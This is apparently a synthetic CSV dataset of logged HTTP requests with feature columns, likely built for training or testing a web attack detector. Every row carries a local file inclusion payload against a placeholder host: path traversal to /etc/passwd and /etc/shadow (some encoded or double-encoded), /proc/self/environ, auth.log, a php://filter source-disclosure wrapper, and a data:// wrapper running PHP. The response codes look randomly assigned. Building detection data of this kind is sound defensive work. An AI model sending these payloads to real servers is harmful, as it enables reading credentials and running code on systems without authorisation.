timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T18:34:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.15,3,4,18,0,403,855
2025-01-01T18:35:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.29,7,1,28,0,403,1013
2025-01-01T18:36:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.32,10,1,27,0,200,916
2025-01-01T18:37:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.85,10,5,19,0,403,801
2025-01-01T18:38:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.2,13,4,36,0,500,1102
2025-01-01T18:39:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.96,10,5,19,0,403,869
2025-01-01T18:40:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.99,4,1,21,0,403,901
2025-01-01T18:41:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.19,13,4,36,0,200,1026
2025-01-01T18:42:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.22,4,1,21,0,500,757
2025-01-01T18:43:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.56,7,1,28,0,200,781
2025-01-01T18:44:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.77,13,6,22,0,403,1020
2025-01-01T18:45:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.02,13,6,22,0,200,739
2025-01-01T18:46:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.7,13,6,22,0,500,1191
2025-01-01T18:47:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.91,10,1,27,0,200,751
2025-01-01T18:48:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.59,15,7,28,0,500,1031
2025-01-01T18:49:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.67,15,7,28,0,200,914
2025-01-01T18:50:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.58,9,5,53,0,200,966
2025-01-01T18:51:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.31,4,1,21,0,403,1020
2025-01-01T18:52:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.88,10,1,27,0,200,1034
2025-01-01T18:53:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.92,10,5,19,0,200,994
2025-01-01T18:54:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.2,9,5,53,0,200,1035
2025-01-01T18:55:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.73,15,7,28,0,403,1157
2025-01-01T18:56:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.28,3,4,18,0,200,884
2025-01-01T18:57:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.68,15,7,28,0,200,1026
2025-01-01T18:58:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.29,7,1,28,0,200,844
2025-01-01T18:59:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.56,13,6,24,0,500,1054
2025-01-01T19:00:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.2,15,7,28,0,500,913
2025-01-01T19:01:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.75,13,4,36,0,403,1117
2025-01-01T19:02:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,3.89,15,7,28,0,200,882
2025-01-01T19:03:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.25,4,1,21,0,500,819
2025-01-01T19:04:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.83,13,6,24,0,403,779
2025-01-01T19:05:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.94,3,4,18,0,500,1124
2025-01-01T19:06:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.77,7,1,28,0,403,818
2025-01-01T19:07:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.54,3,4,18,0,500,913
2025-01-01T19:08:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.67,13,6,24,0,403,1004
2025-01-01T19:09:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.25,10,1,27,0,500,875
2025-01-01T19:10:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.57,10,5,19,0,403,1156
2025-01-01T19:11:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.03,4,1,21,0,200,889
2025-01-01T19:12:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.19,3,4,18,0,500,1012
2025-01-01T19:13:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.67,13,6,24,0,200,1059
2025-01-01T19:14:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.75,10,5,19,0,200,865
2025-01-01T19:15:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.39,15,7,28,0,500,829
2025-01-01T19:16:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.73,9,5,53,0,403,765
2025-01-01T19:17:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.67,3,4,18,0,200,782
2025-01-01T19:18:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.03,9,5,53,0,200,1082
2025-01-01T19:19:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.69,13,4,36,0,500,1115
2025-01-01T19:20:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.32,10,5,19,0,200,795
2025-01-01T19:21:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.5,13,4,36,0,500,1016
2025-01-01T19:22:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.37,3,4,18,0,500,754
2025-01-01T19:23:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.87,13,6,24,0,500,1046
2025-01-01T19:24:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.11,9,5,53,0,200,727
2025-01-01T19:25:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.07,4,1,21,0,200,1160
2025-01-01T19:26:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.43,10,1,27,0,500,868
2025-01-01T19:27:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.04,3,4,18,0,500,971
2025-01-01T19:28:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.86,10,1,27,0,200,765
2025-01-01T19:29:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.19,10,5,19,0,200,853
2025-01-01T19:30:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.9,10,1,27,0,500,810
2025-01-01T19:31:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.25,4,1,21,0,403,706
2025-01-01T19:32:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.14,7,1,28,0,403,1124
2025-01-01T19:33:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.36,13,4,36,0,403,1049
2025-01-01T19:34:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.04,13,4,36,0,403,1147
2025-01-01T19:35:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.89,9,5,53,0,200,808
2025-01-01T19:36:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.63,13,4,36,0,500,1120
2025-01-01T19:37:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.17,10,1,27,0,403,870
2025-01-01T19:38:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.91,10,5,19,0,200,1011
2025-01-01T19:39:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.47,10,1,27,0,500,1119
2025-01-01T19:40:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.46,13,6,22,0,500,953
2025-01-01T19:41:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.76,9,5,53,0,403,1017
2025-01-01T19:42:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.95,13,6,22,0,403,1010
2025-01-01T19:43:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.23,13,6,22,0,403,1153
2025-01-01T19:44:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.0,9,5,53,0,403,746
2025-01-01T19:45:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.45,13,6,24,0,500,1016
2025-01-01T19:46:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.86,10,5,19,0,403,1127
2025-01-01T19:47:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.81,9,5,53,0,403,915
2025-01-01T19:48:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.08,15,7,28,0,403,739
2025-01-01T19:49:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.16,9,5,53,0,403,821
2025-01-01T19:50:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.31,10,1,27,0,200,1128
2025-01-01T19:51:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.91,3,4,18,0,500,798
2025-01-01T19:52:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.33,10,1,27,0,500,863
2025-01-01T19:53:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.53,9,5,53,0,200,1192
2025-01-01T19:54:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.13,13,6,24,0,403,1176
2025-01-01T19:55:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.79,13,6,24,0,403,1080
2025-01-01T19:56:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.24,10,1,27,0,200,882
2025-01-01T19:57:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.2,13,6,22,0,403,976
2025-01-01T19:58:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.35,7,1,28,0,403,1154
2025-01-01T19:59:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.27,13,6,24,0,200,857
2025-01-01T20:00:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.28,13,6,24,0,200,757
2025-01-01T20:01:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.83,13,6,22,0,200,997
2025-01-01T20:02:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.08,13,6,22,0,500,1016
2025-01-01T20:03:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.1,15,7,28,0,500,746
2025-01-01T20:04:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.71,15,7,28,0,200,884
2025-01-01T20:05:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.72,3,4,18,0,200,1135
2025-01-01T20:06:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.77,13,4,36,0,403,827
2025-01-01T20:07:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.88,13,6,24,0,403,1047
2025-01-01T20:08:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.98,15,7,28,0,500,884
2025-01-01T20:09:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.58,13,6,22,0,403,1176
2025-01-01T20:10:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.72,4,1,21,0,403,714
2025-01-01T20:11:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.71,9,5,53,0,500,1088
2025-01-01T20:12:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.71,9,5,53,0,500,1095
2025-01-01T20:13:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.72,15,7,28,0,403,837
2025-01-01T20:14:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.31,9,5,53,0,500,1166
2025-01-01T20:15:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.29,13,6,22,0,403,884
2025-01-01T20:16:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.47,15,7,28,0,200,776
2025-01-01T20:17:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.63,9,5,53,0,500,994
2025-01-01T20:18:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,3.93,9,5,53,0,500,798
2025-01-01T20:19:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.9,13,4,36,0,403,959
2025-01-01T20:20:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.61,13,6,22,0,200,933
2025-01-01T20:21:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.88,4,1,21,0,500,1021
2025-01-01T20:22:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.62,7,1,28,0,403,953
2025-01-01T20:23:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.82,4,1,21,0,200,1134
2025-01-01T20:24:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.35,4,1,21,0,200,1195
2025-01-01T20:25:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.68,10,5,19,0,200,1113
2025-01-01T20:26:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.87,13,4,36,0,200,715
2025-01-01T20:27:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.96,9,5,53,0,200,1083
2025-01-01T20:28:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.11,15,7,28,0,403,1017
2025-01-01T20:29:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.74,10,5,19,0,500,1145
2025-01-01T20:30:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.27,13,6,22,0,403,1075
2025-01-01T20:31:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.51,13,4,36,0,500,949
2025-01-01T20:32:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.14,13,6,22,0,403,1010
2025-01-01T20:33:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.14,10,5,19,0,200,731
2025-01-01T20:34:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.25,10,5,19,0,200,1081
2025-01-01T20:35:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.14,4,1,21,0,403,709
2025-01-01T20:36:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.24,13,4,36,0,500,930
2025-01-01T20:37:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.38,13,6,24,0,500,1165
2025-01-01T20:38:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.19,10,1,27,0,500,943
2025-01-01T20:39:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,3.88,13,4,36,0,500,721
2025-01-01T20:40:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.32,13,4,36,0,403,1123
2025-01-01T20:41:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.14,13,6,22,0,403,1036
2025-01-01T20:42:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.64,13,6,22,0,403,1049
2025-01-01T20:43:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.8,3,4,18,0,403,1083
2025-01-01T20:44:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.22,9,5,53,0,403,1189
2025-01-01T20:45:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.78,7,1,28,0,200,975
2025-01-01T20:46:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.62,15,7,28,0,200,1125
2025-01-01T20:47:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.08,13,4,36,0,500,918
2025-01-01T20:48:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.19,10,5,19,0,200,1078
2025-01-01T20:49:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.68,13,6,24,0,200,1156
2025-01-01T20:50:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.37,13,6,22,0,200,778
2025-01-01T20:51:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.05,13,4,36,0,500,770
2025-01-01T20:52:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.91,9,5,53,0,500,965
2025-01-01T20:53:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.65,9,5,53,0,500,1094
2025-01-01T20:54:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.44,9,5,53,0,500,701
2025-01-01T20:55:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.71,3,4,18,0,403,772
2025-01-01T20:56:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.25,7,1,28,0,200,990
2025-01-01T20:57:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.39,10,1,27,0,500,808
2025-01-01T20:58:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.28,10,5,19,0,403,957
2025-01-01T20:59:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.64,4,1,21,0,200,773
2025-01-01T21:00:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.16,4,1,21,0,500,1141
2025-01-01T21:01:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.74,10,1,27,0,500,1117
2025-01-01T21:02:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.71,7,1,28,0,500,1128
2025-01-01T21:03:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.15,13,6,24,0,200,1155
2025-01-01T21:04:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.15,3,4,18,0,200,1049
2025-01-01T21:05:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.42,9,5,53,0,403,1041
2025-01-01T21:06:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.62,15,7,28,0,500,1027
2025-01-01T21:07:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.03,13,4,36,0,403,1095
2025-01-01T21:08:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.26,13,6,22,0,500,1002
2025-01-01T21:09:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.28,7,1,28,0,500,987
2025-01-01T21:10:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.68,10,5,19,0,200,804
2025-01-01T21:11:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.97,10,5,19,0,500,1046
2025-01-01T21:12:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.23,9,5,53,0,403,984
2025-01-01T21:13:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.24,10,1,27,0,500,995
2025-01-01T21:14:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.72,15,7,28,0,500,744
2025-01-01T21:15:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.21,3,4,18,0,200,920
2025-01-01T21:16:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.05,10,5,19,0,403,749
2025-01-01T21:17:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.03,13,4,36,0,200,1039
2025-01-01T21:18:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.25,3,4,18,0,500,708
2025-01-01T21:19:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.29,4,1,21,0,403,1003
2025-01-01T21:20:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.44,13,4,36,0,500,981
